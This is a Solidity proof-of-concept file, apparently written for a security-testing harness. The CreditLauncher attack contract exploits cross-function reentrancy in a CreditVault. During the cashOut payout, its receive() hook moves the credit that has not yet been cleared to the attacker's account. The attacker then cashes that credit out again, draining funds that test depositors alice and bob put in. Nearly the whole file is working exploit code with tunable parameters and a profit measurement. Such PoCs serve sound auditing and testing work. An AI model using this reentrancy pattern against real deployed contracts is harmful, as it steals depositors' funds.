// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {CreditVault} from "../src/CreditVault.sol";

/// @notice Attack contract: deposits, cashes out, and uses the payout to hand its credit to the
///         attacker's own account while `cashOut` has not yet cleared it.
contract CreditLauncher {
    uint256 private constant BPS = 10_000;

    CreditVault private immutable vault;
    address private immutable owner;
    uint256 private route;
    uint256 private movedBps;

    constructor(CreditVault vault_, address owner_) {
        vault = vault_;
        owner = owner_;
    }

    function attack(uint256 route_, uint256 movedBps_) external payable {
        require(msg.sender == owner, "not owner");
        route = route_;
        movedBps = movedBps_;
        vault.deposit{value: msg.value}();
        vault.cashOut();
        (bool sent,) = owner.call{value: address(this).balance}("");
        require(sent, "payout failed");
    }

    receive() external payable {
        if (msg.sender != address(vault)) return;
        if (route == 0) {
            uint256 amount = vault.creditOf(address(this)) * movedBps / BPS;
            if (amount > 0) vault.moveCredit(owner, amount);
        } else {
            vault.moveAllCredit(owner);
        }
    }
}

/// @notice Cross-function reentrancy: `cashOut` pays before it clears the credit, so the payout
///         can call another function of the vault that moves the credit that is still shown.
/// Knobs:
///   0 `route`      0: the payout calls `moveCredit`; 1: it calls `moveAllCredit`;
///   1 `moved_bps`  with route 0, the part of the credit that is moved, in basis points.
/// The attacker deposits its whole starting balance, and afterwards cashes out the credit that
/// was moved to its own account.
contract CreditVaultCrossFunctionPoC is AssayPoC {
    uint256 private constant BPS = 10_000;

    CreditVault internal vault;

    function setUpTarget() internal override {
        vault = new CreditVault();
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        vm.deal(alice, 12 ether);
        vm.deal(bob, 8 ether);
        vm.prank(alice);
        vault.deposit{value: 12 ether}();
        vm.prank(bob);
        vault.deposit{value: 8 ether}();

        declareAttackerBalance(1 ether, 0.01 ether, 10 ether);
        declareKnob(0, "route", 0, 0, 1);
        declareKnob(1, "moved_bps", BPS, 1, BPS);
    }

    function exploit() internal override {
        uint256 balanceBefore = attacker.balance;

        vm.startPrank(attacker);
        CreditLauncher launcher = new CreditLauncher(vault, attacker);
        launcher.attack{value: balanceBefore}(knob(0), knob(1));
        if (vault.creditOf(attacker) > 0) vault.cashOut();
        vm.stopPrank();

        attacker_profit("eth", balanceBefore, attacker.balance);
    }
}
